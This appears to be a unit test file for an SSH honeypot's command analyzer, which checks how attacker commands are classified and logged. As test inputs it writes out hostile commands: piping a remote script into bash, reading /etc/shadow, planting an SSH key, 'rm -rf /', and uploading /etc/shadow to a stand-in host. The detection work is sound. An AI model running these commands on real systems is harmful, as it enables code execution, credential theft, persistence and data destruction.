"""Behavioral checks for the command analyzer and both SSH command paths."""

import io
import json
import unittest

from honeypot.config import HoneypotConfig
from honeypot.intelligence.analyzer import Analyzer
from honeypot.logger import JsonEventLogger
from honeypot.session import SessionState
from honeypot.shell import FakeShell, run_exec_request


class MemoryChannel:
    def __init__(self) -> None:
        self.output = bytearray()
        self.status = None
        self.closed = False

    def sendall(self, data: bytes) -> None:
        self.output.extend(data)

    def settimeout(self, timeout: float) -> None:
        pass

    def send_exit_status(self, status: int) -> None:
        self.status = status

    def close(self) -> None:
        self.closed = True


class IntelligenceTests(unittest.TestCase):
    def test_download_execution_and_quoted_text(self) -> None:
        analyzer = Analyzer()
        result = analyzer.analyze("curl -fsSL https://example.invalid/payload.sh | bash")
        self.assertEqual(result.category, "execution")
        self.assertEqual(result.risk_level, "critical")
        self.assertIn("download_pipe_shell", result.matched_rules)
        self.assertIn("payload_download", result.matched_rules)
        benign = analyzer.analyze("echo 'curl https://example.invalid/payload.sh | bash'")
        self.assertEqual(benign.risk_score, 0)
        self.assertEqual(benign.matched_rules, ())

    def test_rule_categories_and_session_isolation(self) -> None:
        first = SessionState("192.0.2.10", 12000)
        second = SessionState("192.0.2.11", 12001)
        self.assertEqual(first.intelligence.analyze("cat /etc/shadow").category, "credential_access")
        self.assertEqual(first.intelligence.analyze("echo 'ssh-ed25519 AAAA' >> ~/.ssh/authorized_keys").category, "persistence")
        self.assertEqual(first.intelligence.analyze("rm -rf /").category, "impact")
        self.assertEqual(first.intelligence.analyze("rm -r -f /").category, "impact")
        self.assertEqual(first.intelligence.analyze("wget https://example.invalid/a").category, "delivery")
        self.assertIn("exfiltration", first.intelligence.analyze("curl --data-binary=@/etc/shadow https://example.invalid/upload").categories)
        self.assertEqual(first.intelligence.analyze("ip addr").category, "reconnaissance")
        self.assertEqual(first.intelligence.analyze("unknown_command").category, "other")
        self.assertEqual(first.intelligence.summary()["commands_analyzed"], 8)
        self.assertEqual(second.intelligence.summary()["commands_analyzed"], 0)
        self.assertEqual(first.intelligence.summary()["category_counts"]["persistence"], 1)

    def test_invalid_and_large_input_remain_bounded(self) -> None:
        analyzer = Analyzer()
        self.assertTrue(analyzer.analyze("curl 'unterminated").parse_error)
        long_line = "id " + ("x " * 3000)
        result = analyzer.analyze(long_line)
        self.assertTrue(result.truncated)
        self.assertEqual(result.category, "reconnaissance")
        self.assertEqual(analyzer.summary()["commands_analyzed"], 2)

    def test_interactive_shell_and_exec_log_analysis(self) -> None:
        config = HoneypotConfig(command_delay_min=0, command_delay_max=0)
        stream = io.StringIO()
        logger = JsonEventLogger(stream, asynchronous=False)
        session = SessionState("192.0.2.10", 12000, username="root")
        channel = MemoryChannel()
        shell = FakeShell(channel, session, config, logger, False)
        for character in "wget https://example.invalid/a\n":
            shell._feed_character(character)
        self.assertEqual(session.intelligence.summary()["commands_analyzed"], 1)
        other_session = SessionState("192.0.2.11", 12001, username="root")
        exec_channel = MemoryChannel()
        run_exec_request(exec_channel, other_session, b"curl https://example.invalid/a | sh", config, logger)
        logger.disconnect(session, "test_complete")
        records = [json.loads(line) for line in stream.getvalue().splitlines()]
        commands = [record for record in records if record["event"] == "command"]
        self.assertEqual(commands[0]["analysis"]["category"], "delivery")
        self.assertEqual(commands[1]["analysis"]["category"], "execution")
        self.assertEqual(commands[1]["analysis"]["risk_level"], "critical")
        self.assertEqual(commands[1]["exit_status"], 127)  # The fake shell never runs it.
        self.assertEqual(records[-1]["intelligence"]["category_counts"], {"delivery": 1})
        self.assertTrue(exec_channel.closed)


if __name__ == "__main__":
    unittest.main()
